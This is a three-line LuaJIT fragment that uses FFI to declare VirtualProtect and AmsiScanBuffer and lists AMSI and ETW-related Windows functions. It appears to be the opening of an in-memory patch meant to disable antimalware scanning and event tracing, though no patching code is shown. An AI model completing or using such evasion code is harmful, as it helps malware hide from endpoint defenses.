local ffi = require("ffi")
ffi.cdef("int VirtualProtect(void*,int,int,void*); void* AmsiScanBuffer;")
local names = {"AmsiScanBuffer", "NtTraceEvent", "NtWriteVirtualMemory", "RtlCompareMemory"}
